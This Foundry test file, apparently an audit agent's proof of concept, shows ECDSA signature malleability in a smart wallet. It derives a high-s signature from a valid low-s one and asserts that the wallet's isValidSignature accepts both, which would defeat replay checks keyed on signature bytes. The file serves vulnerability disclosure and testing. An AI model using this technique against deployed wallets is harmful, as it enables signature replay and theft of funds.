// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Factory.sol";
import "../src/Stage1Module.sol";
import "../src/modules/auth/BaseAuth.sol";

contract AuditAgentPoC is ExtendedSessionTestBase {
    // secp256k1 curve order
    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    uint256 constant N_HALF = 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0;

    function test_exploit() public {
        console.log("=== Starting test_exploit ===");
        console.log("block.timestamp:", block.timestamp);

        // 1. Setup: Create Wallet and prepare message
        console.log("Before _createDefaultTopology");
        string memory topology = _createDefaultTopology();
        console.log("After _createDefaultTopology");

        console.log("Before _createWallet");
        (Stage1Module Wallet, string memory config, bytes32 imageHash) = _createWallet(topology);
        console.log("After _createWallet");
        console.log("Wallet address:", address(Wallet));
        console.log("imageHash:", uint256(imageHash));

        bytes32 msgHash = keccak256("test message for signature malleability");
        console.log("msgHash:", uint256(msgHash));

        // 2. Victim produces a valid compact signature (r, s, v)
        // vm.sign returns low-s signatures by default
        console.log("Before vm.sign");
        (uint8 v_low, bytes32 r, bytes32 s_low) = vm.sign(identityWallet.privateKey, msgHash);
        console.log("After vm.sign");
        console.log("v_low:", uint256(v_low));
        console.log("r:", uint256(r));
        console.log("s_low:", uint256(s_low));

        // Ensure s_low is in the lower half (as returned by vm.sign)
        assertLe(uint256(s_low), N_HALF, "vm.sign should return low-s");

        // 3. Attacker computes malleated signature (high-s)
        // s' = n - s, v' = v ^ 1 (flip y-parity)
        uint256 s_high_uint = N - uint256(s_low);
        bytes32 s_high = bytes32(s_high_uint);
        uint8 v_high = v_low ^ 1; // flip parity bit (27 <-> 28)

        console.log("s_high_uint:", s_high_uint);
        console.log("v_high:", uint256(v_high));

        // Verify both recover to the same signer
        address signer_low = ecrecover(msgHash, v_low, r, s_low);
        address signer_high = ecrecover(msgHash, v_high, r, s_high);
        console.log("signer_low:", signer_low);
        console.log("signer_high:", signer_high);
        console.log("identityWallet.addr:", identityWallet.addr);

        assertEq(signer_low, identityWallet.addr, "low-s should recover to victim");
        assertEq(signer_high, identityWallet.addr, "high-s should recover to victim");

        // 4. Construct compact signatures (65 bytes: r + s + v)
        bytes memory sig_low = abi.encodePacked(r, s_low, v_low);
        bytes memory sig_high = abi.encodePacked(r, s_high, v_high);
        console.log("sig_low length:", sig_low.length);
        console.log("sig_high length:", sig_high.length);

        // 5. Attacker exploits the gap: readRSVCompact parses both as valid
        // because it never enforces s <= n/2.
        // We verify this by calling the protocol's signature validation.
        // BaseAuth.isValidSignature returns 0x1626ba7e if valid.
        bytes4 magicValue = 0x1626ba7e;

        console.log("Before isValidSignature low");
        bytes4 result_low = BaseAuth(address(Wallet)).isValidSignature(msgHash, sig_low);
        console.log("After isValidSignature low, result:", uint256(uint32(result_low)));

        console.log("Before isValidSignature high");
        bytes4 result_high = BaseAuth(address(Wallet)).isValidSignature(msgHash, sig_high);
        console.log("After isValidSignature high, result:", uint256(uint32(result_high)));

        // 6. Assert: Both signatures are accepted, but have different byte representations.
        // This proves that any uniqueness check based on signature bytes (e.g. usedSignatures[sig])
        // can be bypassed by submitting the malleated signature.
        assertEq(result_low, magicValue, "protocol accepts low-s signature");
        assertEq(result_high, magicValue, "protocol accepts high-s signature (VULNERABILITY)");

        assertNotEq(keccak256(sig_low), keccak256(sig_high), "signatures have different byte representations");

        // Final assertion to prove the bug exists: high-s is accepted despite s > n/2
        assertGt(uint256(s_high), N_HALF, "s_high is in the upper half of the curve order");

        console.log("=== test_exploit finished successfully ===");
    }
}
